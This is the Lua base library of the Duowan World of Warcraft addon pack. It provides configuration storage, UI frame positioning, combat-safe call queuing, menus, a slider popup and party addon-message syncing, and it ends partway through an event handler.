--=====================================
-- 名称: Duowan
-- 日期: 2009-12-16
-- 版本: 1.0.1
--	描述: 多玩基本库
-- 作者: dugu
-- 版权所有 (C) duowan.com
--======================================

local _DEBUG = true;
local L = DUOWAN_LOCALIZATION;
DUOWAN_ADDON_VERION = 40100;
DW_NewModules = {};
Duowan_Character = {};
DUOWAN_CHARACTER_INFO = "";

-------------
-- 定义常用颜色
DUOWAN_COLOR = {};
DUOWAN_COLOR["WHITE"] = "|cFFFFFFFF"
DUOWAN_COLOR["GREEN"] = "|cFF00FF00"
DUOWAN_COLOR["RED"] = "|cFFFF0000"
DUOWAN_COLOR["COPPER"] = "|cFFEDA55F"
DUOWAN_COLOR["SILVER"] = "|cFFC7C7CF"
DUOWAN_COLOR["GOLD"] = "|cFFFFD700"
DUOWAN_COLOR["GRAY"] = "|cFF808080"
DUOWAN_COLOR["STEELBLUE"] = "|cFF0099CC";
DUOWAN_COLOR["DARKRED"] = "|cFF801b00";
DUOWAN_COLOR["END"] = "|r"
-------------
-- 动作条自动对齐
StickyBarList = {
	"dwMainBar", 
	"dwBottomLeftBar", 
	"dwBottomRightBar", 
	"dwRightBar1", 
	"dwRightBar2", 
	"dwShapeShiftBar", 
	"dwMultiCastBar", 
	--"dwPossessBar", 
	"dwPlayerPetBar"
};

for i=1, 10 do
	tinsert(StickyBarList, "DuowanActionBar" .. i);
end

RevStickyBarList = {};
for k, name in pairs(StickyBarList) do
	RevStickyBarList[name] = true;
end

local DUOWAN_LOADED_ADDONS = {};
DUOWAN_RealmName = GetRealmName();
if not DUOWAN_RealmName then
	DUOWAN_RealmName = "China";
end;
DUOWAN_PlayerName = UnitName("player");
if not DUOWAN_PlayerName then
	DUOWAN_PlayerName = "Unknown";
end;
local BattleGroundGroup;
DUOWAN_PlayerId = DUOWAN_RealmName .. "__" .. DUOWAN_PlayerName;
-- 保存所有的配置
Duowan_CVar = {};
Duowan_CVar[DUOWAN_PlayerId]={};
Duowan_Frames = {};
Duowan_PublicVar = {};
Duowan_PublicVar[DUOWAN_RealmName] = {};

dwStaticPopupDialogs["DUOWAN_RELOADUI_CONFIRM"] = {
	text = L["禁用插件要|cffff7000重新载入界面|r才能生效,\n是否选择立即重载？\n如果取消|cffffff00下次登录|r时会禁用此模块"],
	button1 = TEXT(OKAY),
	button2 = TEXT(CANCEL),
	OnAccept = function()		
		ReloadUI();
	end,
	OnCancel = function(_, reason)		
		if ( reason == "clicked" and type(dwStaticPopupDialogs["DUOWAN_RELOADUI_CONFIRM"].onCancelled) == "function") then
			dwStaticPopupDialogs["DUOWAN_RELOADUI_CONFIRM"].onCanceled();
		end 	
	end,
	timeout = 30,
	showAlert = 1,
	hideOnEscape = 1,
	whileDead = 1,
};

dwStaticPopupDialogs["DUOWAN_RELOADUI"] = {
	text = L["确定|cffff7000重新载入界面|r?"],
	button1 = TEXT(OKAY),
	button2 = TEXT(CANCEL),
	OnAccept = function()		
		ReloadUI();
	end,
	OnCancel = function()
	end,
	timeout = 30,
	showAlert = 1,
	hideOnEscape = 1,
	whileDead = 1,
};


function dwReloadUI()
	dwStaticPopup_Show("DUOWAN_RELOADUI");	
end

function dwRequestReloadUI(onCancelled)
	dwStaticPopupDialogs["DUOWAN_RELOADUI_CONFIRM"].onCancelled = onCancelled;
	dwStaticPopup_Show("DUOWAN_RELOADUI_CONFIRM");	
end

function dwGetPublicCVar()
	if (not Duowan_PublicVar) then
		Duowan_PublicVar = {};
	end
	if (not Duowan_PublicVar[DUOWAN_RealmName]) then
		Duowan_PublicVar[DUOWAN_RealmName] = {};
	end
	return Duowan_PublicVar[DUOWAN_RealmName];
end

-- 获取配置信息, 否则获得缺省配置
function dwGetCVar(module, name)
	local vals, isDef;
	if ((Duowan_CVar[DUOWAN_PlayerId]) and (Duowan_CVar[DUOWAN_PlayerId][module])) then		
		if (not Duowan_CVar[DUOWAN_PlayerId][module][name]) then
			DW_NewModules[module] = true;
			dwLoadDefaultCVar(module, name);			
		end
	else		
		dwLoadDefaultCVar(module);	
	end	

	vals = Duowan_CVar[DUOWAN_PlayerId][module][name] or 0;

	return vals, isDef;
end

function dwRawGetCVar(module, name, default)
	if ((Duowan_CVar[DUOWAN_PlayerId]) and (Duowan_CVar[DUOWAN_PlayerId][module]) and Duowan_CVar[DUOWAN_PlayerId][module][name] ~= nil) then
		return Duowan_CVar[DUOWAN_PlayerId][module][name];
	else
		return default;
	end
end
-- 设置配置信息
function dwSetCVar(module, name, value)	
	if (not Duowan_CVar) then
		Duowan_CVar = {};
	end
	if (not Duowan_CVar[DUOWAN_PlayerId]) then
		Duowan_CVar[DUOWAN_PlayerId] = {};
	end

	if (not Duowan_CVar[DUOWAN_PlayerId][module]) then
		Duowan_CVar[DUOWAN_PlayerId][module] = {};
	end

	Duowan_CVar[DUOWAN_PlayerId][module][name] = value;
end

local function dwFindVarFromMod(module, name)	
	for i, v in pairs(DuowanConfiguration[module]) do
		if (v.variable == name) then
			return v;
		end
	end

	return nil;
end
-- 载入缺省的配置信息
function dwLoadDefaultCVar(module, name)
	if (module) then
		if (name) then			
			if (not DuowanConfiguration[module]) then
				Duowan_CVar[DUOWAN_PlayerId][module] = Duowan_CVar[DUOWAN_PlayerId][module] or {};
				Duowan_CVar[DUOWAN_PlayerId][module][name] = 0;					
			else
				Duowan_CVar[DUOWAN_PlayerId][module] = Duowan_CVar[DUOWAN_PlayerId][module] or {};
				local t = dwFindVarFromMod(module, name);
				if (t) then					
					Duowan_CVar[DUOWAN_PlayerId][module][name] = t.default;
				else
					Duowan_CVar[DUOWAN_PlayerId][module][name] = 0;
				end
			end
		else
			if (not Duowan_CVar) then
				Duowan_CVar= {};
			end
			if (not Duowan_CVar[DUOWAN_PlayerId]) then
				 Duowan_CVar[DUOWAN_PlayerId]={};
			end
			 
			if (not Duowan_CVar[DUOWAN_PlayerId][module]) then
				Duowan_CVar[DUOWAN_PlayerId][module]={};
			end
			-- 这里也可做类型检查
			for k, v in pairs(DuowanConfiguration[module]) do
				if (v.variable) then	
					Duowan_CVar[DUOWAN_PlayerId][module][v.variable] = v.default;
				end
			end
		end
	else		
		if (not Duowan_CVar) then
			Duowan_CVar= {};
		end
			if (not Duowan_CVar[DUOWAN_PlayerId]) then
				 Duowan_CVar[DUOWAN_PlayerId]={};
			end
		for module, config in pairs(DuowanConfiguration) do
			if (not Duowan_CVar[DUOWAN_PlayerId][module]) then
				Duowan_CVar[DUOWAN_PlayerId][module] = {};
			end
			for k, v in ipairs(config) do
				if (v.variable) then
					Duowan_CVar[DUOWAN_PlayerId][module][v.variable] = v.default;
				end
			end
		end
	end
	return true;
end

-- [-[--------------------------------------------
-- 常用函数

function dwGetSpellNum()
	local _, _, offset, numSpells = GetSpellTabInfo(GetNumSpellTabs());
	return offset + numSpells;
end

function dwShowKeyBindingFrame(arg)
	KeyBindingFrame_LoadUI();	
	
	if (not arg) then			
		ShowUIPanel(KeyBindingFrame);
		return;
	else
		local numBindings = GetNumBindings();
		for i = 1, numBindings do
			local commandName = GetBinding(i);
			if ( commandName == arg ) then
				ShowUIPanel(KeyBindingFrame);
				KeyBindingFrameScrollFrameScrollBar:SetValue((i-1)*KEY_BINDING_HEIGHT);
				return;
			end
		end
	end
end

-- 判断是否是duowan的插件
function isDuowanAddOn(name)
	if (GetAddOnMetadata(name, "X-Revision") ~= "Duowan") then
		return false;
	end

	return true;
end
-- 判断该插件是否可以配置
function dwIsConfigurableAddOn(name)
	local name, title, notes, loadable, reason, security, newVersion = GetAddOnInfo(name);
	if (isDuowanAddOn(name) and reason ~= "DISABLED") then
		return true;
	else
		return false;
	end
end

function dwIsBigFootAddOn(name)
	local name, title, notes, loadable, reason, security, newVersion = GetAddOnInfo(name);
	if (GetAddOnMetadata(name, "X-Revision") == "BigFoot" and reason ~= "DISABLED") then
		return true;
	end

	return false;
end
--[==[
do
if (GetLocale() == "zhCN") then
	function BuildCharactorInfo()
		Duowan_Character.name = UnitName("player");
		Duowan_Character.realm = GetRealmName();
		Duowan_Character.sex = UnitSex("player");
		Duowan_Character.race = select(2, UnitRace("player"));
		Duowan_Character.faction = UnitFactionGroup("player");
		Duowan_Character.level = UnitLevel("player");
		Duowan_Character.class = select(2, UnitClass("player"));
		Duowan_Character.region = "cn"..DWU_GetRegion();
		local guild = GetGuildInfo("player");		
		Duowan_Character.guild = ((guild and guild ~= "") and guild) or Duowan_Character.guild;
	end
	
	local tempInfo = {};
	function BuildMountsInfo()
		tempInfo["mounts"] = {};
		local creatureID, creatureName, spellID;
		local count = GetNumCompanions("MOUNT");
		for index=1, count do
			creatureID, creatureName, spellID = GetCompanionInfo("MOUNT", index);
			table.insert(tempInfo["mounts"], {spellID, creatureName});
		end
	end

	function BuildBagItemInfo()
		tempInfo["weapons"] = {};
		tempInfo["bagequipments"] = {};
		local numSlots, itemID, itemName, itemType, _;
		for bag=0, 4 do
			numSlots = GetContainerNumSlots(bag);
			for slot=1, numSlots do
				itemID = GetContainerItemID(bag, slot);
				if (itemID) then
					itemName, _, _, _, _, itemType = GetItemInfo(itemID);
					if (itemType == "武器") then
						table.insert(tempInfo["weapons"], {itemID, tostring(itemName), -1});
					elseif (itemType == "护甲") then
						table.insert(tempInfo["bagequipments"], {itemID, tostring(itemName), -1});
					end
				end
			end
		end
	end

	function BuildInventoryInfo()
		tempInfo["equipments"] = {};
		local itemID, itemName;
		for index=1, 17 do
			itemID = GetInventoryItemID("player", index);
			if (itemID) then
				itemName = GetItemInfo(itemID);
				table.insert(tempInfo["equipments"], {itemID, tostring(itemName), index});
			end
		end
	end

	function SerializeItemInfo()		
		local tmp = "[{";
		-- 基本信息
		local CLASS = select(2, UnitClass("player"));
		local RACE = select(2, UnitRace("player"));
		tmp = tmp .. ([["rolename":"%s",]]):format(UnitName("player"));
		tmp = tmp .. ([["servername":"%s",]]):format(GetRealmName());
		tmp = tmp .. ([["race":"%s",]]):format(string.lower(RACE));
		tmp = tmp .. ([["profession":"%s",]]):format(string.lower(CLASS));
		tmp = tmp .. ([["gender":%d,]]):format(UnitSex("player")-2);	-- 0:男; 1:女;
		-- 坐骑信息
		tmp = tmp .. "\"mounts\":[";
		for k, v in ipairs(tempInfo["mounts"]) do
			if (k == #(tempInfo["mounts"])) then
				tmp = tmp .. ([[{"id":%d,"name":"%s"}]]):format(v[1], v[2]);
			else
				tmp = tmp .. ([[{"id":%d,"name":"%s"},]]):format(v[1], v[2]);
			end			
		end
		-- 武器信息		
		tmp = tmp .. "],\"weapons\":[";
		for k, v in ipairs(tempInfo["weapons"]) do
			if (k == #(tempInfo["weapons"])) then
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d}]]):format(v[1], v[2], v[3]);
			else
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d},]]):format(v[1], v[2], v[3]);
			end			
		end
		-- 装备信息
		tmp = tmp .. "],\"equipments\":[";
		for k, v in ipairs(tempInfo["equipments"]) do
			if (k == #(tempInfo["equipments"])) then
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d}]]):format(v[1], v[2], v[3]);
			else
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d},]]):format(v[1], v[2], v[3]);
			end
		end
		-- 背包中装备信息
		tmp = tmp .. "],\"bagequipments\":[";
		for k, v in ipairs(tempInfo["bagequipments"]) do
			if (k == #(tempInfo["bagequipments"])) then
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d}]]):format(v[1], v[2], v[3]);
			else
				tmp = tmp .. ([[{"id":%d,"name":"%s","partid":%d},]]):format(v[1], v[2], v[3]);
			end			
		end
		tmp = tmp .. "]}]";

		DUOWAN_CHARACTER_INFO = tmp;
	end	

	local frame = CreateFrame("Frame");
	frame:RegisterEvent("FRIENDLIST_UPDATE");
	frame:RegisterEvent("GUILD_ROSTER_UPDATE");
	frame:RegisterEvent("PLAYER_LOGIN");
	frame:RegisterEvent("PLAYER_LOGOUT");

	frame:SetScript("OnEvent", function(this, event, ...)
		if (event == "GUILD_ROSTER_UPDATE") then
			local guild = GetGuildInfo("player");		
			Duowan_Character.guild = ((guild and guild ~= "") and guild) or Duowan_Character.guild;
			return;
		end
		BuildCharactorInfo();
	end);
	
	GameMenuFrame:HookScript("OnShow", function()
		BuildMountsInfo();
		BuildBagItemInfo();
		BuildInventoryInfo();
		SerializeItemInfo();
	end);
end
end
]==]

-----------------------
-- 同步队伍消息
function dwSendSync(prefix, msg)
	msg = msg or ""
	local ret = true;
	if IsInGroup(LE_PARTY_CATEGORY_INSTANCE) and IsInInstance() then
		SendAddonMessage(prefix,msg, "INSTANCE_CHAT")
	else
		if IsInRaid() then
			SendAddonMessage(prefix, msg, "RAID")
		elseif IsInGroup(LE_PARTY_CATEGORY_HOME) then
			SendAddonMessage(prefix, msg, "PARTY")
		else
			ret = false;
		end
	end
	return ret;
end
-----------------------
-- 
ModManagement_RegisterMod = function() end
ModManagement_RegisterCheckBox = function() end
-- Prints a table in an organized format
function PrintTable(table, rowname, level)
	if ( rowname == nil ) then rowname = "ROOT"; end
	if ( level == nil ) then level = 1; end

	local msg = "";
	for i=1,level, 1 do
		msg = msg .. "   ";
	end

	if ( table == nil ) then ChatFrame1:AddMessage (msg.."["..rowname.."] := nil "); return end
	if ( type(table) == "table" ) then
		ChatFrame1:AddMessage (msg..rowname.." { ");
		for k,v in pairs(table) do
			PrintTable(v,k,level+1);
		end
		ChatFrame1:AddMessage (msg.."} ");
	elseif (type(table) == "function" ) then
		ChatFrame1:AddMessage (msg.."["..rowname.."] => {{FunctionPtr*}}");
	elseif (type(table) == "userdata" ) then
		ChatFrame1:AddMessage (msg.."["..rowname.."] => {{UserData}}");
	elseif (type(table) == "boolean" ) then
		local value = "true";
		if ( not table ) then
			value = "false";
		end
		ChatFrame1:AddMessage (msg.."["..rowname.."] => "..value);
	else
		ChatFrame1:AddMessage (msg.."["..rowname.."] => "..table);
	end
end

function Duowan_ShowNewbieTooltip(title, ...) 
	 GameTooltip_SetDefaultAnchor(GameTooltip, UIParent); 
	 GameTooltip:SetText(title, 1.0, 1.0, 1.0); 
	 local args = {...}; 
	 local i;
	 for i = 1, table.maxn(args), 1 do 
		 GameTooltip:AddLine(args[i], NORMAL_FONT_COLOR.r, NORMAL_FONT_COLOR.g, NORMAL_FONT_COLOR.b, 1.0, 1); 
	 end 
	 GameTooltip:Show(); 
 end 
-------------------
-- 保存框架位置
local sf = {};	 -- 需要保存位置的框架
local f = CreateFrame("Frame", nil, UIParent);
f:SetScript("OnUpdate", function(self, elapsed)
	for frame, _ in pairs(sf) do
		frame.duration = frame.duration - elapsed;
		if (frame.duration <= 0) then			
			Duowan_Frame_Save(frame, frame.layout_id);
			sf[frame] = nil;
		end
	end
end);

function Duowan_Frame_Save(frame, id)	
	if (frame and id) then
		local left = frame:GetLeft();
		local top = frame:GetTop();
		local width = frame:GetWidth();
		local height = frame:GetHeight();	
		
		if (left and top and width and height) then
			Duowan_Frames[id] = {};
			Duowan_Frames[id].X = math.floor(left + 0.5);
			Duowan_Frames[id].Y = math.floor(top + 0.5);
			Duowan_Frames[id].W = math.floor(width + 0.5);
			Duowan_Frames[id].H = math.floor(height + 0.5);
		end
	end
end

function Duowan_Frame_Load(frame, id, noSize)
	if (frame and Duowan_Frames[id]) then
		frame:ClearAllPoints();
		frame:SetPoint("TOPLEFT", "UIParent", "BOTTOMLEFT", Duowan_Frames[id].X, Duowan_Frames[id].Y);
		if (not noSize) then
			frame:SetWidth(Duowan_Frames[id].W);
			frame:SetHeight(Duowan_Frames[id].H);
		end
	end
end

function Duowan_Frame_StopMovingOrSizing(self)
	if (self.originalStopMovingOrSizing) then
		self.originalStopMovingOrSizing(self);
	end
	
	-- Debug(format("%s OnMoving!", self:GetName()))
	self.duration = 1;
	sf[self] = true;	
end

function dwRegisterForSaveFrame(frame, id, noSize)
	assert(frame ~= nil, "frame must be assigned.");
	assert(type(frame) == "table", "dwRegisterForSaveFrame: the first parameter must be frame object.");

	if (not id) then
		id = frame:GetName();
	end

	assert(id ~= nil, "The frame has no name, can not be used as default id.");

	frame.layout_id = id;

	if (not frame.rfsf_hooked) then
		frame.rfsf_hooked = true;
		frame.originalStopMovingOrSizing = frame.StopMovingOrSizing;
		frame.StopMovingOrSizing = Duowan_Frame_StopMovingOrSizing;
	end
	
	Duowan_Frame_Load(frame, id, noSize);
end

function Debug(msg)
	if (_DEBUG) then
		Print(msg);
	end
end

------------------------
-- 战斗状态调用栈(队列)

local stack = {};
local frame = CreateFrame("Frame");
local index = 0;
local sequence = {};
frame:RegisterEvent("PLAYER_REGEN_ENABLED");
function dwPush(func, argn, byarg)	
	assert(type(func) == "function", "First argument must be a function value.");

	index = index + 1;
	if (byarg) then
		stack[func] = stack[func] or {};	
		sequence[func] = sequence[func] or {};

		stack[func][argn[1]] = argn;
		sequence[func][argn[1]] = index;
	else
		stack[func] = {};
		sequence[func] = {};
		stack[func][1] = argn;
		sequence[func][1] = index;
	end	
end

function dwRunCallStack()
	local tmp = {};
	local tmp2= {};
	for func, v in pairs(sequence) do
		for arg1, index in pairs(v) do
			tmp[index] = {func, arg1};
		end
	end
	
	for k, v in pairs(tmp) do
		tinsert(tmp2, k);
	end
	table.sort(tmp2);
	local func, arg1;
	for i=1, #(tmp2) do
		func = tmp[tmp2[i]][1];
		arg1 = tmp[tmp2[i]][2];
		if (func and type(func) == "function"  and stack[func] and stack[func][arg1]) then
			pcall(func, unpack(stack[func][arg1]));
		end
	end

	stack = {};
	sequence = {};
	index = 0;
end

frame:SetScript("OnEvent", function(self)
	dwRunCallStack();
end);

function dwSecureCall(func, ...)	
	if (type(func) == "function") then
		if (InCombatLockdown()) then
			dwPush(func, {...});
			return;
		end
		
		pcall(func, ...);
	end
end

function dwSecureCall2(func, argn, byarg)	
	if (type(func) == "function") then
		if (InCombatLockdown()) then
			dwPush(func, argn, byarg);
			return;
		end

		pcall(func, unpack(argn));
	end
end

function dwRemoveSecureCall(func, arg1)	
	if (type(func) == "function" and stack[func]) then
		if (arg1 and stack[func][arg1]) then
			stack[func][arg1] = nil;
			sequence[func][arg1] = nil;
			return;
		end
		stack[func] = nil;
		sequence[func] = nil;
	end
end
-------------------------
-- 更合理的定位和缩放

local function AjustPosition(frame, parent)	
	--assert(type(frame:GetFrameType()) == "string", "Invalid <frame>, the type of frame must be userdata.");
	parent = parent or UIParent;
	-- 
	local limitX = parent:GetRight()/frame:GetScale();   
	local limitY = parent:GetTop()/frame:GetScale();
	
	local xr = frame:GetRight();
	local yt = frame:GetTop();
	local xl = frame:GetLeft();
	local yb = frame:GetBottom();
	if (xr and yt and xl and yb) then	
		local x = (xr > limitX and (limitX-xr)) or (xl < 0 and (0-xl)) or 0;
		local y = (yt > limitY and (limitY-yt)) or (yb < 0 and (0-yb)) or 0;	

		local cx = (x + xl);	
		local cy = (y + yt);

		if (cx~=0 or cy~=0) then
			frame:SetPoint("TOPLEFT", parent, "BOTTOMLEFT", cx, cy);
		end
	end
end
--------------
-- 更安全的定位
function dwSetPoint(frame, point,relativeFrame,relativePoint, xOfs, yOfs)	
	local parent = frame:GetParent() or UIParent;
	xOfs = xOfs/parent:GetScale();
	yOfs = yOfs/parent:GetScale();
	frame:SetPoint(point,relativeFrame,relativePoint, xOfs, yOfs);	
	AjustPosition(frame, parent);
end

local function GetAjustcoord(frame, nscale)
	if (not (frame:GetTop() and frame:GetLeft())) then
		return nil;
	end

	local x = frame:GetLeft() * frame:GetScale() / nscale;
	local y = frame:GetTop() * frame:GetScale() / nscale;
	return x, y;
end
------------------
-- 更合理的缩放
function dwSetScale(frame, nscale)	
	assert(type(nscale) == "number", "Invalid <scale>, the type of scale must be number.");	
	
	local x, y = GetAjustcoord(frame, nscale);
	frame:SetScale(nscale);	
	frame:ClearAllPoints();
	frame:SetPoint("TOPLEFT", UIParent, "BOTTOMLEFT", x, y);	
	AjustPosition(frame);
end

-------------------
-- 空函数
function DUMMY_FUNC() end

-------------------
-- 异步调用(安全的调用别的插件的函数)
do
local AsynCallFuncs = {};
function dwAsynCall(AddOnName, funcName, ...)
	if (IsAddOnLoaded(AddOnName) and type(_G[funcName]) == "function") then
		_G[funcName](...);
	else
		AsynCallFuncs[AddOnName] = AsynCallFuncs[AddOnName] or {};
		AsynCallFuncs[AddOnName][funcName] = {...};
	end
end

function dwAsynUncall(AddOnName, funcName)
	if (AsynCallFuncs[AddOnName] and AsynCallFuncs[AddOnName][funcName]) then		
		AsynCallFuncs[AddOnName][funcName] = nil;		
	end
end
local frame = CreateFrame("Frame");
frame:RegisterEvent("ADDON_LOADED");
frame:SetScript("OnEvent", function(self, event, addon)
	if (AsynCallFuncs[addon]) then		
		for func, args in pairs(AsynCallFuncs[addon]) do
			if (type(_G[func]) == "function") then					
				_G[func](unpack(args));
			end
		end
	end
end);
end

----------------------------
-- 克隆表格 | 删除表格
function dwCloneTable(t)
	assert(type(t) == "table");
	local tmp = {};
	for k, v in pairs(t) do
		if (type(v) == "table") then
			tmp[k] = dwCloneTable(v);
		else
			tmp[k] = v;
		end
	end
	return tmp;
end

function dwNukeTable(t)
	assert(type(t) == "table");

	for k, v in pairs(t) do
		if (type(v) == "table") then
			dwNukeTable(v);
		else
			v = nil;
		end
	end
end
----------------------------
-- 延迟调用 | 渐隐关闭
local dwDelayCallStack = {};
local dwFadeOutStack = {};
function dwDelayCall(name, time, ...)	
	local tmp = {};
	if (type(name) == "string") then
		if (not dwDelayCallStack[name] and type(_G[name]) == "function") then
			tmp[1] = _G[name];
			tmp[2] = time;
			tmp[3] = {...};
			tmp["_T"] = 0;
			dwDelayCallStack[name] = tmp;
		end
	elseif (type(name) == "function") then
		tmp[1] = name;
		tmp[2] = time;
		tmp[3] = {...};
		tmp["_T"] = 0;
		tinsert(dwDelayCallStack, tmp);
	end	
end

function dwClearDelayCall(name)
	dwDelayCallStack[name] = nil;
end

function dwFadeOut(frame, time, startAlpha, endAlpha)
	local fadeInfo = {};
	fadeInfo[1] = frame;
	fadeInfo[2] = time or 1;
	fadeInfo[3] = startAlpha or 1;
	fadeInfo[4] = endAlpha or 0;

	tinsert(dwFadeOutStack, fadeInfo);
end

local frame = CreateFrame("Frame");
frame:SetScript("OnUpdate", function(self, elapsed)
	for name,  v in pairs(dwDelayCallStack) do
		v._T = v._T + elapsed;
		if (type(v[1]) == "function" and v._T > v[2]) then				
			v[1](unpack(v[3]));
			dwDelayCallStack[name] = nil;
		elseif (type(v[1]) ~= "function") then
			dwDelayCallStack[name] = nil;
		end
	end

	for index, fadeInfo in ipairs(dwFadeOutStack) do
		if (type(fadeInfo) == "table" and fadeInfo[2]) then
			if ( not fadeInfo.fadeTimer ) then
				fadeInfo.fadeTimer = 0;
			end
			fadeInfo.fadeTimer = fadeInfo.fadeTimer + elapsed;

			if (fadeInfo.fadeTimer < fadeInfo[2]) then				
				local value = ((fadeInfo[2] - fadeInfo.fadeTimer) / fadeInfo[2]) * (fadeInfo[3] - fadeInfo[4])  + fadeInfo[4];
				value = math.floor(value * 1000) / 1000;
				fadeInfo[1]:SetAlpha(value);
			else
				fadeInfo[1]:Hide();				
				fadeInfo[1] = nil;
				fadeInfo[2] = nil;
				fadeInfo[3] = nil;
				fadeInfo[4] = nil;
				fadeInfo = nil;				
			end
		end
	end
end);

function printf(pattern, ...)
	assert(type(pattern) == "string");
	local text = format(pattern, ...);
	pcall(print, text);
end

-----------------------
-- 动态载入插件
function dwLoadAddOn(addon)
	if (dwIsConfigurableAddOn(addon)) then	
		DUOWAN_LOADED_ADDONS[addon] = 1;
		if (not IsAddOnLoaded(addon)) then
			EnableAddOn(addon);
			LoadAddOn(addon);
		end
	end
end

function dwIsAddOnLoaded(addon)
	if (dwIsConfigurableAddOn(addon) and IsAddOnLoaded(addon)) then
		return true;
	end
	return false;
end

-----------------------
-- 简单的菜单创建
DWEASY_MENU_INDEX = 1;

function dwEasyMenu(menuList, menuFrame, anchor, x, y, displayMode)		
	UIDropDownMenu_Initialize(menuFrame, DWEasyMenu_Initialize, displayMode, nil, menuList);
end

function DWEasyMenu_Initialize(frame, level, menuList)		
	if (type(menuList) == "table") then	
		local info = UIDropDownMenu_CreateInfo();	
		for index = 1, #(menuList) do
			info = menuList[index];		
			if (info.text) then
				info.index = index;
				info.level = info.level or 1;
				if (level == info.level) then				
					UIDropDownMenu_AddButton(info, level);	
				else				
					if (info.hasArrow and info.subMenu and UIDROPDOWNMENU_MENU_VALUE == info.value) then					
						DWEasyMenu_Initialize(info.subMenu, level);
						return;
					end
				end
			end
		end
	end
end

function DWEasyMenu_Register(parent, menuList)	
	parent:RegisterForClicks("LeftButtonDown", "LeftButtonUp", "RightButtonUp");
	local name = parent:GetName() and parent:GetName() .. "MenuFrame" or "DuowanEasyMenu" .. DWEASY_MENU_INDEX;
	parent.menuFrame = parent.menuFrame or CreateFrame("Frame", name, parent, "UIDropDownMenuTemplate");
	parent.menuFrame:Hide();
	dwEasyMenu(menuList, parent.menuFrame, "cursor", nil, nil, "MENU");
	if (parent:GetScript("OnClick")) then
		parent:HookScript("OnClick", function(self, button)			
			if (button == "RightButton") then
				ToggleDropDownMenu(nil, nil, self.menuFrame, "cursor",  nil, nil, menuList);
			end
		end);
	else		
		parent:SetScript("OnClick", function(self, button)	
			if (button == "RightButton") then				
				ToggleDropDownMenu(nil, nil, self.menuFrame, "cursor", nil, nil, menuList);
			end
		end);
	end
	DWEASY_MENU_INDEX = DWEASY_MENU_INDEX + 1;
end

-----------------------
-- 范围控件

local function Duowan_CreatePopRange()	
	local frame = CreateFrame("Frame", "Duowan_PopRangeFrame", UIParent);
	tinsert(UISpecialFrames, "Duowan_PopRangeFrame");
	frame:SetWidth(280);
	frame:SetHeight(100);
	frame:SetToplevel(true);
	frame:EnableMouse(true);
	frame:SetBackdrop({bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background", 
		  edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border", tile = true, tileSize = 32, edgeSize = 32, 
		  insets = { left = 11, right = 12, top = 12, bottom = 11}});
	frame:SetPoint("TOP", UIParent, "TOP", 0, -120);
	frame:Hide();
	frame.slider = CreateFrame("Slider", "Duowan_PopRangeSlider", frame, "OptionsSliderTemplate");
	frame.slider.highText = getglobal("Duowan_PopRangeSliderHigh");
	frame.slider.lowText = getglobal("Duowan_PopRangeSliderLow");
	frame.slider.valueText = getglobal("Duowan_PopRangeSliderText");
	frame.slider.thumb = getglobal("Duowan_PopRangeSliderThumb");
	frame.slider:SetWidth(180);
	frame.slider:SetPoint("TOP", frame, "TOP", 0, -30);
	frame.slider:SetScript("OnValueChanged", function(self)
		local value = self:GetValue();
		frame.curV = value;
		if (frame.showPrecent) then
			self.valueText:SetText(format("%d%%",floor( value*100)));
		else
			self.valueText:SetText(value);
		end
		frame.func(value);
	end);	
	frame.okay = CreateFrame("Button", "Duowan_PopRangeOkay", frame, "UIPanelButtonTemplate2");
	frame.okay:SetText(TEXT(OKAY));
	frame.okay:SetPoint("BOTTOMLEFT", frame, "BOTTOMLEFT", 30, 16 );
	frame.okay:SetWidth(100);
	frame.okay:SetScript("OnClick", function(self)
		frame:Hide();
	end);
	frame.okay:Show();
	frame.cancel = CreateFrame("Button", "Duowan_PopRangeCancel", frame, "UIPanelButtonTemplate2");
	frame.cancel:SetText(TEXT(CANCEL));
	frame.cancel:SetPoint("BOTTOMRIGHT", frame, "BOTTOMRIGHT", -30, 16);
	frame.cancel:SetWidth(100);
	frame.cancel:SetScript("OnClick", function(self)		
		frame.func(frame.preV);
		frame:Hide();
	end);
	frame.cancel:Show();
	frame:SetScript("OnShow", function(self)
		PlaySound("igMainMenuClose");
		if (self.onShow and type(self.onShow) == "function") then
			self.onShow(self.curV);
		end
	end);
	frame:SetScript("OnHide", function(self)
		PlaySound("igMainMenuClose");
		if (self.onHide and type(self.onHide) == "function") then
			self.onHide(self.curV);
		end
	end);
	
	return frame;
end

function Duowan_ShowPopRange(minV, maxV, value, step, showPrecent, func, onShow, onHide, tooltip)	
	local frame = _G["Duowan_PopRangeFrame"] or Duowan_CreatePopRange();
	frame.onShow = onShow;
	frame.onHide = onHide;
	frame.func = func;	
	frame.preV = value or 0.5;
	frame.curV = value or 0.5;
	frame.minV = minV or 0;
	frame.maxV = maxV or 1;	
	frame.step = step or 0.1;
	frame.slider.tooltipText = tooltip;
	frame.showPrecent = showPrecent or nil; -- [nil|true] nil - 按值显示, true - 按百分比显示; 
	
	frame.slider:SetValueStep(frame.step);
	frame.slider:SetMinMaxValues(frame.minV, frame.maxV);
	frame.slider:SetValue(frame.curV);
	if (frame.showPrecent) then
		frame.slider.valueText:SetText(format("%d%%", floor(frame.curV*100)));
		frame.slider.highText:SetText(format("%d%%", floor(frame.maxV*100)));
		frame.slider.lowText:SetText(format("%d%%", floor(frame.minV*100)));
	else
		frame.slider.valueText:SetText(floor(frame.curV/(frame.maxV - frame.minV)));
		frame.slider.highText:SetText(frame.maxV);
		frame.slider.lowText:SetText(frame.minV);
	end

	frame:Show();
end

do
	local frame = CreateFrame("Frame");
	frame:RegisterEvent("CHAT_MSG_ADDON");
	frame:SetScript("OnEvent", function(self, event, ...)
		local prefix, msg, channel, sender = ...;
		-- 检查GearScore
		if sender ~= DUOWAN_PlayerName and msg and channel ~= "WHISPER" and prefix == "DWGS" then
			if (msg == "DWGS" and GearScore_GetScore and GearScore_GetQuality) then	
				local gs = GearScore_GetScore(DUOWAN_PlayerName, "player");
				if (gs < 500) then 
					r, b, g = 1, 1, 1;
				else
					r, b, g = GearScore_GetQuality(gs);
				end
				local gsText = format("|cff%02x%02x%02x%d|r", r*255, g*255, b*255, gs);
				
				dwSendSync("DWGS", gsText);
			end
		end
		-- 同步YY频道ID
